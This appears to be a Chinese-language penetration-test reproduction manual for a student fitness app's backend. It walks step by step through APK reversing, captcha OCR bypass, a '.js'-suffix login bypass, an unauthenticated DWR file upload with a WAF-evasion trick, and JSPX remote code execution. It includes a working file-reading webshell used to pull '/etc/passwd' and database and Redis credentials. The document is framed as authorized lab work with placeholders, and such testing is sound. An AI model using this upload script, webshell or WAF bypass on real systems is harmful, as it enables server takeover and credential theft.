# 体适能 App 授权评估：逐步复现手册

> **配套文档**：[WRITEUP.md](./WRITEUP.md)（思路与影响）、[README.md](./README.md)（索引）
> **用途**：在**已获书面授权**的靶场副本中，按步骤复刻本报告中的发现。
> **重要**：本文所有域名、IP、账号、密码、哈希、令牌、密钥均为占位符，真实值已隐去。请勿把任何命令指向未授权系统。

---

## 0. 前置条件

### 0.1 适用对象

本手册假设读者：

- 具备基本的 Linux 命令行能力；
- 了解 HTTP、Cookie、multipart、JSON；
- 能阅读少量 Java 代码；
- 已在授权方提供的靶场中操作，而不是在生产环境。

### 0.2 环境清单

| 类别 | 工具 | 用途 |
|---|---|---|
| 基础 | `curl`、`python3`（3.9+） | 发请求、写脚本 |
| APK | `apktool`、`jadx`、`unzip` | 解包、反编译 |
| Native | `nm`、`strings`、`readelf`、unidbg | 符号定位、动态调用 |
| OCR | `ddddocr`、`Pillow`、`numpy` | 验证码识别与预处理 |
| 数据库 | `mysql` 客户端（可选） | 验证 JDBC 结果 |
| SSH | `ssh`、`nc` | 端口与认证验证 |
| 抓包（可选） | Burp Suite / mitmproxy | 观察请求 |

安装示例（仅列出，不在本文执行）：

```bash
python3 -m venv venv
. venv/bin/activate
pip install ddddocr pillow numpy cryptography
```

### 0.3 变量约定

先在一个新的 shell 中定义变量。示例值全部指向本地靶场，不要替换成真实生产地址。

```bash
# 业务网关（Pig4Cloud）
export TARGET="http://127.0.0.1:8080"

# 旧管理后台（Spring MVC + DWR）
export ADMIN="http://127.0.0.1:8081"

# 应用级凭据（靶场快照中的值）
export APP_ID="<APP_ID>"
export APP_SECRET="<APP_SECRET>"
export CERT_FP="<CERT_FINGERPRINT>"

# OAuth client（学校代码）
export SCHOOL_CODE="<SCHOOL_CODE>"

# 数据库 / Redis（靶场快照中的值）
export DB_HOST="<DB_HOST>"
export DB_NAME="<DB_NAME>"
export DB_USER="<DB_USER>"
export DB_PASSWORD="<DB_PASSWORD>"
export REDIS_HOST="<REDIS_HOST>"
export REDIS_PASSWORD="<REDIS_PASSWORD>"

# 内网服务器
export SSH_HOST="<SSH_HOST>"
export ROOT_ACCOUNT="root"
export ROOT_PASSWORD="<ROOT_PASSWORD>"

# 后台管理员
export ADMIN_ACCOUNT="<ADMIN_ACCOUNT>"
export ADMIN_HASH="<ADMIN_HASH>"
```

> 约定：下文命令中的 `$TARGET`、`$ADMIN` 等变量都指向**靶场**。如果你的靶场使用 HTTPS 自签名证书，命令中的 `-k` 仅用于实验环境；生产环境不要关闭证书校验。

### 0.4 安全约束（必须遵守）

1. 只在授权靶场执行；开始前确认授权书中的域名/IP 清单。
2. 限速不超过 1 请求/秒；单类测试不超过 3 个请求。
3. 不爆破、不喷洒、不并发压测。
4. 不上传后门、不写计划任务、不改密码、不删业务数据。
5. 所有读取到的真实数据只保存在本地加密目录，测试结束后销毁。
6. 一旦触发 WAF 连接重置或服务 502，立即停止，等待授权方确认恢复。

### 0.5 靶场准备

1. 为靶场创建快照，确保可以回滚。
2. 确认靶场与生产环境网络隔离。
3. 如果靶场使用域名，在本地 `hosts` 中指向靶场 IP：

```bash
# 仅示例；实际 IP 由授权方提供
sudo sh -c 'echo "127.0.0.1 <TARGET_DOMAIN> <ADMIN_BACKEND>" >> /etc/hosts'
```

4. 准备一个工作目录：

```bash
mkdir -p ~/tsn-lab/{apk,jadx,payloads,evidence,logs}
cd ~/tsn-lab
```

5. 每次请求都记录时间、URL、状态码、响应长度：

```bash
log() { echo "[$(date -u +%FT%TZ)] $*" | tee -a ~/tsn-lab/logs/requests.log; }
```

### 0.6 配套探测工具（可选）

仓库中的 `tsn_ctf_probe.py` 是一个带安全护栏的封装，适合做“单次、精确”的验证：

```bash
# 默认 dry-run：只打印请求与 curl 等价命令，不发送
python3 tsn_ctf_probe.py --target "$TARGET" --mode signed-version --school-id 1

# 真正发送：必须同时声明已授权
python3 tsn_ctf_probe.py --target "$TARGET" --mode signed-version \
  --school-id 1 --execute --authorized
```

它的安全限制：

- 默认 dry-run；
- `--execute` 与 `--authorized` 必须同时出现；
- 已知生产域名默认拦截，需额外 `--allow-production-domain`（高风险，不建议在常规复现中使用）；
- 单次运行最多 5 个请求；
- 支持 `oldtsn`、`oauth`、`signed-version`、`signed-upload`、`schools`、`school-detail`、`permission`、`devmode` 等模式。

> 本文的手工命令与工具可以互相印证。工具不是“自动攻击器”，只是减少手误。

---

## 1. 阶段 1：APK 逆向

### 1.1 目标

还原 41 条真实端点，理解 `@Test(demo=...)` 诱饵机制、`Transform.k` / `dz` 解密链路和应用级签名算法。

### 1.2 解包与反编译

```bash
cd ~/tsn-lab/apk
unzip -o app-release.apk -d unzipped
apktool d -f app-release.apk -o apktool_out
jadx -d ../jadx/out app-release.apk
```

预期：

- `unzipped/lib/arm64-v8a/libtsnsecret.so` 存在；
- `apktool_out/AndroidManifest.xml` 可读；
- `jadx/out/sources/` 下有 `com/bxkj/student/`、`com/bxkj/base/` 等目录。

排错：

| 现象 | 原因 | 处理 |
|---|---|---|
| `apktool` 报加固/资源错误 | APK 被加固 | 使用脱壳后的 DEX；本文假设已有 `cap_4`/`cap_8` |
| `jadx` 内存不足 | 类太多 | 加大 `-Xmx`，或只反编译指定 DEX |
| 找不到 `libtsnsecret.so` | ABI 目录不同 | `find unzipped/lib -name 'libtsnsecret.so'` |

### 1.3 找到诱饵注解

```bash
cd ~/tsn-lab/jadx/out/sources
rg -n '@Test\(demo' | head -20
```

预期看到类似：

```java
@Test(demo = "<CIPHERTEXT>")
@POST("app/login")
Object D(...);
```

统计数量：

```bash
rg -o '@Test\(demo\s*=\s*"[0-9a-f]+"' | wc -l
```

预期为 41（不同脱壳版本可能略有差异，以实际为准）。

### 1.4 找到拦截器

```bash
rg -n 'getAnnotation\(.*Test|demo\(\)' com/bxkj | head -20
```

预期定位到类似：

```java
Test t = method.getAnnotation(Test.class);
String url = b0.b.l(context, t.demo());
if (!url.startsWith("http://") && !url.startsWith("https://"))
    url = baseUrl + url;
request.newBuilder().url(url).build();
```

这说明：**注解里的路径是诱饵，`demo` 解密结果才是真实路径**。

### 1.5 定位 native 符号

```bash
cd ~/tsn-lab/apk
SO=unzipped/lib/arm64-v8a/libtsnsecret.so

nm -D "$SO" | rg 'dz|aes_decrypt|rsa_decrypt|generateAuthInfo|getSignatureByte'
```

预期看到（地址可能因版本不同）：

```text
00000000003d322c T _Z2dzP7_JNIEnvP8_jobjectS2_P8_jstring
...
```

确认签名串：

```bash
strings -a -t x "$SO" | rg 'Landroid/content/Context'
```

预期找到类似：

```text
3f2112 (Landroid/content/Context;Ljava/lang/String;)Ljava/lang/String;
```

### 1.6 解析 JNINativeMethod 表（可选）

如果只想复现解密结果，可以跳过本节，直接使用 unidbg 调用 `dz`。如果想知道为什么注册表里的函数指针是 0，可以按以下思路：

1. 解析 ELF 的 `PT_LOAD`，建立文件偏移与虚拟地址的映射；
2. 在文件中搜索签名串的地址（8 字节小端）；
3. 反查 `{name*, sig*, fn*}` 三元组；
4. 检查 `.rela.dyn` 是否有对应重定位；
5. 如果没有重定位，说明函数指针在 `JNI_OnLoad` 运行时填充。

这不是复现攻击链的必需步骤，但能解释“为什么静态表里看不到函数地址”。

### 1.7 用 unidbg 调用 `dz`

核心思路：加载 SO，准备一个 `Context` 对象，调用 `dz(JNIEnv*, jobject, jobject, jstring)`，把密文传进去，读回字符串。

伪代码：

```java
// 1. 创建模拟器
AndroidEmulator emulator = new AndroidEmulator(new File("unidbg-android/src/test/resources/rootfs"), null);

// 2. 加载 SO
Module module = emulator.loadLibrary(new File("libtsnsecret.so"));

// 3. 准备 Context（需要能通过 JNI 调用的对象）
DvmObject<?> context = vm.resolveClass("android/content/Context").newObject(null);

// 4. 准备密文字符串
StringObject cipher = new StringObject(vm, "<CIPHERTEXT>");

// 5. 调用 dz
long OFF_DZ = 0x3d322cL;
String result = (String) module.callFunction(
    emulator,
    OFF_DZ,
    emulator.getJNIEnv(),
    null,          // jobject thiz
    context,
    cipher
);

System.out.println(result);
```

预期：

```text
https://<TARGET_DOMAIN>/
```

批量循环 41 个密文，预期全部返回可打印 URL 或相对路径。

排错：

| 现象 | 原因 | 处理 |
|---|---|---|
| `UnsatisfiedLinkError` | SO 架构/依赖不匹配 | 使用 arm64-v8a；确认 OpenSSL 静态链接 |
| 返回 null | Context 不完整 | 补全 `getPackageName`、`getPackageManager` 等桩 |
| 返回乱码 | 密文/密钥不对 | 确认使用 `@Test(demo)` 的原始 hex |
| 崩溃 | `auth()` 证书校验失败 | 在 harness 中提供与样本匹配的证书，或跳过校验 |

> 说明：本文不提供完整的 unidbg harness 源码，因为它依赖具体样本与证书。复现时以“能调用 `dz` 并得到正确 URL”为准。

### 1.8 验证 41 条端点

把解密结果与 Java 层调用点对照：

```bash
rg -n 'exerciseRecord|exerciseSetting|basUser|sysSchool' ~/tsn-lab/jadx/out/sources | head
```

预期：每个解密路径都能在业务代码中找到对应调用（参数、返回类型一致）。

### 1.9 复现签名算法

用 Python 复刻 2.0.22 的签名逻辑：

```python
import hashlib, time

APP_ID = "<APP_ID>"
APP_SECRET = "<APP_SECRET>"

def sign(params: dict, app_id=APP_ID, app_secret=APP_SECRET, ts=None) -> dict:
    ts = ts or str(int(time.time() * 1000))
    base = {k: str(v) for k, v in params.items() if k != "sign"}
    m = dict(base)
    m["appId"] = app_id
    m["timestamp"] = ts
    m["appSecret"] = app_secret
    concat = "&".join(f"{k}={m[k]}" for k in sorted(m))
    sig = hashlib.md5(concat.encode()).hexdigest()
    body = dict(base)
    body["timestamp"] = ts
    body["sign"] = sig
    return body, concat, sig

body, concat, sig = sign({"schoolId": "1", "appSign": "<CERT_FINGERPRINT>"})
print("concat =", concat)
print("sign   =", sig)
print("body   =", body)
```

预期：

- `concat` 按 key 字典序排列；
- `body` 中**不包含** `appId`、`appSecret`；
- `body` 包含 `timestamp` 和 `sign`。

排错：

| 现象 | 原因 | 处理 |
|---|---|---|
| 服务端返回签名错误 | 字段顺序/编码不一致 | 确认值不做 URL 编码；确认包含 timestamp |
| 签名通过但业务报错 | 参数缺失 | 对照真实请求补齐字段 |
| 时间戳被拒 | 服务器时间偏差 | 校准时间；检查时间戳单位（毫秒） |

---

## 2. 阶段 2：侦察

**目标**：确认两套登录入口、验证码机制与会话行为，为后续鉴权绕过建立基线。

### 2.1 基线检查

```bash
log "baseline target"
curl -sk -o /dev/null -w "%{http_code} %{content_type}\n" "$TARGET/"

log "baseline admin"
curl -sk -o /dev/null -w "%{http_code} %{content_type}\n" "$ADMIN/admin/login"
```

预期：

```text
200 text/html
200 text/html
```

排错：

| 现象 | 原因 | 处理 |
|---|---|---|
| `000` | 网络不通/代理错误/TLS 失败 | 检查 `curl -v`；确认靶场地址 |
| `502` | 上游 Tomcat 无响应 | 停止，联系授权方 |
| `403` | WAF 拦截 | 降低频率；换正常 User-Agent |
| `404` | 路径/版本不同 | 确认靶场版本与样本一致 |

### 2.2 业务网关验证码

准备 Cookie jar：

```bash
JAR=~/tsn-lab/evidence/target.cookies
rm -f "$JAR"
curl -sk -c "$JAR" -b "$JAR" "$TARGET/" -o /dev/null
```

生成随机串并取验证码：

```bash
R=$(python3 -c 'import random; print(random.randint(10**15, 10**16-1))')
echo "randomStr=$R"
curl -sk -c "$JAR" -b "$JAR" "$TARGET/code?randomStr=$R&send=0" \
  -o ~/tsn-lab/evidence/captcha_target.jpg
file ~/tsn-lab/evidence/captcha_target.jpg
```

预期：

```text
JPEG image data ...
```

关键点：`code` 和 `randomStr` 必须在**查询串**。如果你把 `randomStr` 放到 POST body，服务端会认为验证码为空。

### 2.3 用 ddddocr 识别

```python
# ~/tsn-lab/ocr.py
import re, sys
import ddddocr

path = sys.argv[1]
data = open(path, "rb").read()

for beta in (False, True):
    try:
        s = ddddocr.DdddOcr(show_ad=False, beta=beta).classification(data).strip()
        s = re.sub(r"[^A-Za-z0-9]", "", s)
        if re.fullmatch(r"[A-Za-z0-9]{4,6}", s):
            print(s)
            break
    except Exception as e:
        print("ERR", e, file=sys.stderr)
else:
    print("")
```

运行：

```bash
CODE=$(python3 ~/tsn-lab/ocr.py ~/tsn-lab/evidence/captcha_target.jpg)
echo "code=$CODE"
```

预期：输出 4~6 位字母数字。

排错：

| 现象 | 原因 | 处理 |
|---|---|---|
| 空字符串 | 图片不是验证码/识别失败 | 检查文件类型；重取一次 |
| 长度不对 | 模型误识别 | 换 `beta=True`；做灰度/二值化 |
| 每次都失败 | 验证码带干扰线 | 预处理：去噪、放大、二值化 |

### 2.4 业务网关登录请求

业务网关使用 OAuth2 密码模式。标准 Pig4Cloud 的密码传输加密是：

- AES-128-CBC；
- key = iv = `thanks,pig4cloud`（16 字节）；
- ZeroPadding；
- Base64。

> 说明：`thanks,pig4cloud` 是 Pig4Cloud 框架的公开默认传输密钥，不是本目标的专属 appSecret；生产部署应替换。

生成密文：

```bash
python3 - <<'PY'
import base64
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes

def enc(pwd: str) -> str:
    key = iv = b"thanks,pig4cloud"
    data = pwd.encode()
    data += b"\x00" * (16 - len(data) % 16)
    c = Cipher(algorithms.AES(key), modes.CBC(iv)).encryptor()
    return base64.b64encode(c.update(data) + c.finalize()).decode()

print(enc("<PASSWORD>"))
PY
```

登录请求模板（**code/randomStr 在查询串**）：

```bash
ENC=$(python3 - <<'PY'
import base64
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
key = iv = b"thanks,pig4cloud"
data = b"<PASSWORD>"
data += b"\x00" * (16 - len(data) % 16)
c = Cipher(algorithms.AES(key), modes.CBC(iv)).encryptor()
print(base64.b64encode(c.update(data) + c.finalize()).decode())
PY
)

curl -sk -c "$JAR" -b "$JAR" -X POST \
  "$TARGET/auth/oauth/token?grant_type=password&scope=server&code=$CODE&randomStr=$R&username=<USERNAME>&password=$ENC" \
  -H "Authorization: Basic $(printf '%s:pig' "$SCHOOL_CODE" | base64)" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -H "model: Pixel-7" \
  -d "type=app" \
  -w "\nHTTP %{http_code}\n"
```

预期：

- 验证码正确、账号密码正确：返回 `access_token`、`refresh_token`、`expires_in`、`user_id`；
- 验证码错误：返回“验证码不合法”/428；
- 账号密码错误：返回 `invalid_grant` 或业务错误；
- 未知用户：可能返回 500/`server_error`（不同实现不同）。

排错：

| 现象 | 原因 | 处理 |
|---|---|---|
| `验证码不能为空` | `code/randomStr` 放在 body | 移到 query string |
| `验证码不合法` | 识别错/过期 | 重新取图，保持同一 Cookie |
| `invalid_grant` | 账号密码错误 | 停止，不要爆破 |
| 500 `server_error` | 用户不存在或后端异常 | 记录，不要重试轰炸 |
| 401 | client 认证失败 | 检查 Basic 的 `schoolCode:pig` |

> 说明：部分环境使用 `RSA:` 前缀 + Base64(PKCS#1 v1.5) 的密码格式。若靶场是这种实现，把 `password` 换成 `RSA:<base64>`，公钥从登录页 JS 或靶场文档获取。核心仍然是：**验证码参数放查询串**。

### 2.5 旧后台验证码

```bash
JAR2=~/tsn-lab/evidence/admin.cookies
rm -f "$JAR2"
curl -sk -c "$JAR2" -b "$JAR2" "$ADMIN/admin/login" -o /dev/null
curl -sk -c "$JAR2" -b "$JAR2" "$ADMIN/code/captcha-image" \
  -o ~/tsn-lab/evidence/captcha_admin.jpg
file ~/tsn-lab/evidence/captcha_admin.jpg
```

旧后台验证码通常带颜色干扰。可以做一个红色通道掩码：

```python
# ~/tsn-lab/ocr_admin.py
import re, sys
import numpy as np
from PIL import Image
import ddddocr

im = Image.open(sys.argv[1]).convert("RGB")
a = np.array(im).astype(int)
R, G, B = a[:, :, 0], a[:, :, 1], a[:, :, 2]
mask = (R > 110) & ((R - G) > 40) & ((R - B) > 40)
Image.fromarray(np.where(mask, 0, 255).astype("uint8")).save("/tmp/admin_mask.png")

s = ddddocr.DdddOcr(show_ad=False).classification(open("/tmp/admin_mask.png", "rb").read())
s = re.sub(r"[^A-Za-z0-9]", "", s).lower()
print(s if re.fullmatch(r"[a-z0-9]{3,6}", s) else "")
```

运行：

```bash
CODE2=$(python3 ~/tsn-lab/ocr_admin.py ~/tsn-lab/evidence/captcha_admin.jpg)
echo "code=$CODE2"
```

关键点：**统一转小写**。旧后台验证码区分大小写，OCR 输出大写时直接提交会失败。

### 2.6 旧后台登录请求

```bash
curl -sk -c "$JAR2" -b "$JAR2" -X POST "$ADMIN/admin/login" \
  -H "X-Requested-With: XMLHttpRequest" \
  -H "Referer: $ADMIN/" \
  --data-urlencode "uname=$ADMIN_ACCOUNT" \
  --data-urlencode "pwd=<PASSWORD>" \
  --data-urlencode "code=$CODE2" \
  -w "\nHTTP %{http_code}\n"
```

预期：

- 成功：返回 JSON 成功标志或 302 到后台主页；
- 失败：返回“账号或密码错误”；
- 验证码错误：返回“验证码错误”。

排错：

| 现象 | 原因 | 处理 |
|---|---|---|
| 验证码错误 | 大小写/识别错 | 统一小写；重新取图 |
| 账号或密码错误 | 凭据不对 | 停止；不要爆破 |
| 302 到登录页 | 会话未建立 | 检查 Cookie jar 是否同一个 |
| 403 | WAF/来源限制 | 降低频率；检查 Referer |

### 2.7 阶段 2 记录

至少记录：

- 请求时间、URL、状态码；
- 验证码图片与识别结果；
- 响应体前 500 字节；
- 是否建立会话 Cookie。

---

## 3. 阶段 3：`.js` 后缀鉴权绕过

**目标**：验证 `/admin/*` 的登录拦截是否可以通过 `.js` 后缀绕过，并确认能访问哪些后台页面。

### 3.1 对比 `/admin/main` 与 `/admin/main.js`

```bash
log "admin main"
curl -sk -D ~/tsn-lab/evidence/main.headers "$ADMIN/admin/main" \
  -o ~/tsn-lab/evidence/main.body
head -20 ~/tsn-lab/evidence/main.headers
cat ~/tsn-lab/evidence/main.body
```

预期：200，body 是跳转登录的 JavaScript。

```bash
log "admin main.js"
curl -sk -D ~/tsn-lab/evidence/main_js.headers "$ADMIN/admin/main.js" \
  -o ~/tsn-lab/evidence/main_js.body
wc -c ~/tsn-lab/evidence/main_js.body
head -5 ~/tsn-lab/evidence/main_js.body
```

预期：

```text
5198 /home/.../main_js.body
<!DOCTYPE html>
<html>
...
```

如果字节数不同，以实际为准；关键是 body 是**后台主页 HTML**，不是登录跳转。

### 3.2 确认是完整后台页面

```bash
rg -n 'outlooktree|admin/loginout|menu|sidebar' ~/tsn-lab/evidence/main_js.body | head
```

预期能看到菜单、退出链接、资源引用。

### 3.3 读取菜单树

```bash
curl -sk "$ADMIN/resources/data/outlooktree.txt" \
  -o ~/tsn-lab/evidence/outlooktree.txt
wc -c ~/tsn-lab/evidence/outlooktree.txt
head -20 ~/tsn-lab/evidence/outlooktree.txt
```

预期：约 3991 字节的菜单树文本，含系统管理、版本管理、账户管理、监控等。

### 3.4 批量验证页面（低速）

只挑 3~5 个页面，间隔 1 秒：

```bash
for p in \
  "/admin/userAppLogFile/toList.js" \
  "/admin/theServer/toTheServerList.js" \
  "/admin/monitor/toMonitorIndex.js" \
  "/admin/systemOperation/toSystemOperationList.js"; do
  code=$(curl -sk -o /dev/null -w "%{http_code}" "$ADMIN$p")
  echo "$code  $p"
  sleep 1
done
```

预期全部 200。

排错：

| 现象 | 原因 | 处理 |
|---|---|---|
| 302 | 该路径被单独保护 | 记录；换其他页面 |
| 404 | 路径不存在 | 从菜单树/主页找真实路径 |
| 406 | JSON 控制器不接受 `.js` | 不要对 JSON 接口用后缀绕过 |
| 200 但 body 是登录页 | 修复或规则变化 | 停止，记录为已修复 |

### 3.5 阶段 3 记录

- `/admin/main` 与 `/admin/main.js` 的响应差异；
- 菜单树文件大小与内容摘要；
- 可访问页面清单。

---

## 4. 阶段 4：DWR 未授权与任意文件写入

**目标**：确认 DWR 是否未授权，并验证 `uploadApkToDesDir` 能否写入 Web 可访问目录。

### 4.1 发现 DWR

```bash
curl -sk "$ADMIN/dwr/index.html" -o ~/tsn-lab/evidence/dwr_index.html
rg -n 'dwrUploadService|Modules known' ~/tsn-lab/evidence/dwr_index.html

curl -sk "$ADMIN/dwr/interface/dwrUploadService.js" \
  -o ~/tsn-lab/evidence/dwrUploadService.js
wc -c ~/tsn-lab/evidence/dwrUploadService.js
rg -n 'uploadApkToDesDir|uploadFile|uploadApkFile' \
  ~/tsn-lab/evidence/dwrUploadService.js
```

预期：

```text
Modules known to DWR:
  dwrUploadService ...
```

以及接口脚本中出现 `uploadApkToDesDir` 等方法。

### 4.2 打开 DWR 测试页（只读）

```bash
curl -sk "$ADMIN/dwr/test/dwrUploadService" \
  -o ~/tsn-lab/evidence/dwr_test.html
rg -n 'uploadApkToDesDir|uploadFile|setTargetSource' \
  ~/tsn-lab/evidence/dwr_test.html | head
```

预期：测试页列出可调用方法。

### 4.3 先发一次无害文本调用

目的：确认 `plaincall` 协议与 `instanceId=0` 是否正确。

```bash
BASE="$ADMIN"
curl -sk -X POST \
  "$BASE/dwr/call/plaincall/dwrUploadService.uploadApkToDesDir.dwr" \
  -H "Content-Type: text/plain" \
  --data-binary $'callCount=1\npage=/dwr/test/dwrUploadService\nhttpSessionId=\nscriptSessionId=\nbatchId=0\ninstanceId=0\nc0-scriptName=dwrUploadService\nc0-methodName=uploadApkToDesDir\nc0-id=0\nc0-param0=string:tsn_probe.txt\n' \
  -w "\nHTTP %{http_code}\n"
```

预期：

- 如果缺少文件流，可能返回参数错误/500；
- 如果返回 `Failed to find parameter: instanceId`，说明 `instanceId` 没被识别（检查换行/编码）。

### 4.4 用 multipart 上传文件

DWR 的文件参数需要 multipart。下面是一个最小 Python 脚本：

```python
#!/usr/bin/env python3
# ~/tsn-lab/dwr_upload.py
# 用法：python3 dwr_upload.py <保存文件名> <本地文件> [multipart文件名]
import os, ssl, sys, uuid, urllib.request, urllib.error

BASE = os.environ.get("ADMIN", "http://127.0.0.1:8081")
save_name = sys.argv[1]
local_file = sys.argv[2]
wire_name = sys.argv[3] if len(sys.argv) > 3 else "file.txt"

content = open(local_file, "rb").read()
boundary = "----DWR" + uuid.uuid4().hex

def field(name, value):
    return (f'--{boundary}\r\n'
            f'Content-Disposition: form-data; name="{name}"\r\n\r\n'
            f'{value}\r\n').encode()

body = bytearray()
for k, v in [
    ("callCount", "1"),
    ("page", "/dwr/test/dwrUploadService"),
    ("httpSessionId", ""),
    ("scriptSessionId", ""),
    ("batchId", "0"),
    ("instanceId", "0"),                 # 必须
    ("c0-scriptName", "dwrUploadService"),
    ("c0-methodName", "uploadApkToDesDir"),
    ("c0-id", "0"),
    ("c0-param0", save_name),            # 真正保存名
]:
    body += field(k, v)

body += (f'--{boundary}\r\n'
         f'Content-Disposition: form-data; name="c0-param1"; filename="{wire_name}"\r\n'
         f'Content-Type: application/octet-stream\r\n\r\n').encode()
body += content
body += b"\r\n"
body += f"--{boundary}--\r\n".encode()

url = BASE.rstrip("/") + "/dwr/call/plaincall/dwrUploadService.uploadApkToDesDir.dwr"
req = urllib.request.Request(url, data=bytes(body), method="POST")
req.add_header("Content-Type", f"multipart/form-data; boundary={boundary}")

ctx = ssl.create_default_context()
ctx.check_hostname = False
ctx.verify_mode = ssl.CERT_NONE

try:
    with urllib.request.urlopen(req, timeout=20, context=ctx) as r:
        print("HTTP", r.status)
        print(r.read(4000).decode("utf-8", "replace"))
except urllib.error.HTTPError as e:
    print("HTTP", e.code)
    print(e.read(4000).decode("utf-8", "replace"))
```

准备一个无害文件：

```bash
printf 'TSN_PROBE_CONTENT\n' > ~/tsn-lab/payloads/probe.txt
python3 ~/tsn-lab/dwr_upload.py tsn_probe.txt ~/tsn-lab/payloads/probe.txt file.txt
```

预期返回：

```json
{"path":"resources/teacherApk/tsn_probe.txt","returnCode":"200"}
```

### 4.5 验证写入

```bash
curl -sk "$ADMIN/resources/teacherApk/tsn_probe.txt" -w "\nHTTP %{http_code}\n"
```

预期：

```text
TSN_PROBE_CONTENT
HTTP 200
```

### 4.6 WAF 绕过：`p0` 决定保存名 + `file.txt`

先用 `.jsp` 试一次（预期被 WAF 拦）：

```bash
printf '<%% out.print(31337*3); %%>\n' > ~/tsn-lab/payloads/probe.jsp
python3 ~/tsn-lab/dwr_upload.py probe.jsp ~/tsn-lab/payloads/probe.jsp probe.jsp
```

如果返回连接重置/000/403，说明 WAF 检查了 multipart 文件名 `probe.jsp`。此时改为：

```bash
python3 ~/tsn-lab/dwr_upload.py probe.jspx ~/tsn-lab/payloads/probe.jspx file.txt
```

- `c0-param0` = `probe.jspx`（服务端保存名，WAF 不检查）；
- `filename` = `file.txt`（WAF 检查的传输名，良性）。

预期返回：

```json
{"path":"resources/teacherApk/probe.jspx","returnCode":"200"}
```

排错：

| 现象 | 原因 | 处理 |
|---|---|---|
| `Failed to find parameter: instanceId` | 缺少 `instanceId=0` | 补上，检查字段是否被当成文件 |
| `Method not found` | 方法名/大小写错 | 对照 `dwr/interface/*.js` |
| 500 | 参数类型不对 | 确认 `c0-param0` 是字符串，`c0-param1` 是文件 |
| 连接重置 | WAF 命中 | 用 `file.txt`，内容先放无害文本 |
| 写入成功但 404 | 保存目录不是 `resources/teacherApk/` | 用返回的 `path` 访问 |
| 403 | 静态目录权限 | 换方法或目录，停止扩大 |

---

## 5. 阶段 5：JSPX RCE

### 5.1 目标

用 EL 表达式证明服务端求值，再用 scriptlet 执行 Java。

### 5.2 最小 EL 探针

创建 `probe.jspx`：

```xml
<?xml version="1.0" encoding="UTF-8"?>
<jsp:root xmlns:jsp="http://java.sun.com/JSP/Page" version="2.0">
  <jsp:text>${31337*3}</jsp:text>
</jsp:root>
```

上传（保存名 `probe_<random>.jspx`，传输名 `file.txt`）：

```bash
NAME="probe_$(date +%s).jspx"
python3 ~/tsn-lab/dwr_upload.py "$NAME" ~/tsn-lab/payloads/probe.jspx file.txt
```

访问：

```bash
curl -sk "$ADMIN/resources/teacherApk/$NAME" -w "\nHTTP %{http_code}\n"
```

预期：

```text
94011
HTTP 200
```

如果返回 `94011`，说明：

1. JSPX 被编译；
2. EL 在服务端执行；
3. 输出回显。

### 5.3 文件读取 payload

创建 `read.jspx`：

```xml
<?xml version="1.0" encoding="UTF-8"?>
<jsp:root xmlns:jsp="http://java.sun.com/JSP/Page" version="2.0">
<jsp:scriptlet>
String f = request.getParameter("f");
if (f != null) {
  java.io.File file = new java.io.File(f);
  if (!file.isAbsolute()) file = new java.io.File(application.getRealPath("/"), f);
  out.print("=== " + file.getAbsolutePath() + " ===\n");
  java.io.FileInputStream in = new java.io.FileInputStream(file);
  byte[] buf = new byte[8192];
  int n;
  while ((n = in.read(buf)) > 0) out.print(new String(buf, 0, n, "UTF-8"));
  in.close();
}
</jsp:scriptlet>
</jsp:root>
```

上传：

```bash
READ="read_$(date +%s).jspx"
python3 ~/tsn-lab/dwr_upload.py "$READ" ~/tsn-lab/payloads/read.jspx file.txt
```

验证：

```bash
curl -sk "$ADMIN/resources/teacherApk/$READ?f=/etc/passwd" | head
```

预期：输出 `/etc/passwd` 的前几行。

### 5.4 环境探针

创建 `env.jspx`：

```xml
<?xml version="1.0" encoding="UTF-8"?>
<jsp:root xmlns:jsp="http://java.sun.com/JSP/Page" version="2.0">
<jsp:scriptlet>
out.print("ROOT=" + application.getRealPath("/") + "\n");
out.print("BASE=" + System.getProperty("catalina.base") + "\n");
out.print("DIR=" + System.getProperty("user.dir") + "\n");
</jsp:scriptlet>
</jsp:root>
```

上传并访问，记录 Web 根、`catalina.base`、`user.dir`。后续读配置时用相对路径。

> 说明：JSP EL 里不要使用 `T(...)`（那是 SpEL 语法）；环境探针用 scriptlet 更稳。

排错：

| 现象 | 原因 | 处理 |
|---|---|---|
| 404 | 文件没写/保存名错 | 看 DWR 返回的 `path` |
| 500 | JSPX 语法错误 | 检查 XML 声明、命名空间、标签闭合 |
| 返回源码 | 容器未解析 `.jspx` | 换 `.jsp` 或确认容器配置 |
| 连接重置 | WAF 命中内容 | 先传纯文本，逐步增加内容 |
| `94011` 不出现 | EL 被禁用 | 用 scriptlet 直接 `out.print(31337*3);` |

---

## 6. 阶段 6：配置读取

**目标**：从 Web 根读取配置文件，确认 DB/Redis 凭据是否明文存放。

### 6.1 读取 `backup.properties`

```bash
curl -sk "$ADMIN/resources/teacherApk/$READ?f=WEB-INF/classes/backup.properties"
```

预期看到类似（值已隐去）：

```properties
database=jdbc:mysql://<DB_HOST>:3306/<DB_NAME>?...
database_username=<DB_USER>
database_password=<DB_PASSWORD>
redis.host=<REDIS_HOST>
redis.port=6379
redis.password=<REDIS_PASSWORD>
```

如果相对路径不对，用环境探针拿到的 `ROOT` 拼绝对路径：

```bash
curl -sk "$ADMIN/resources/teacherApk/$READ?f=<WEBROOT>/WEB-INF/classes/backup.properties"
```

### 6.2 读取其他配置

```bash
for f in \
  "WEB-INF/classes/upload.properties" \
  "WEB-INF/dispatcher-servlet.xml" \
  "WEB-INF/spring.xml" \
  "Dockerfile"; do
  echo "===== $f ====="
  curl -sk "$ADMIN/resources/teacherApk/$READ?f=$f" | head -40
  sleep 1
done
```

重点看：

- `mvc:resources` 的映射，解释 `/resources/**` 为什么可访问；
- 上传目录配置；
- 数据源、Redis、集群配置；
- 基础镜像与维护者信息（本文不展开）。

### 6.3 解析配置

把 `backup.properties` 保存到本地：

```bash
curl -sk "$ADMIN/resources/teacherApk/$READ?f=WEB-INF/classes/backup.properties" \
  -o ~/tsn-lab/evidence/backup.properties
```

提取关键字段（只打印键名，避免泄露值）：

```bash
python3 - <<'PY'
import re
for line in open("/home/user/tsn-lab/evidence/backup.properties", encoding="utf-8", errors="replace"):
    line = line.strip()
    if not line or line.startswith("#"):
        continue
    k = line.split("=", 1)[0]
    if any(x in k for x in ("database", "redis", "cluster")):
        print(k, "= <REDACTED>")
PY
```

排错：

| 现象 | 原因 | 处理 |
|---|---|---|
| 404 | 路径不对 | 用 `ROOT` 拼绝对路径；`find` 式搜索 |
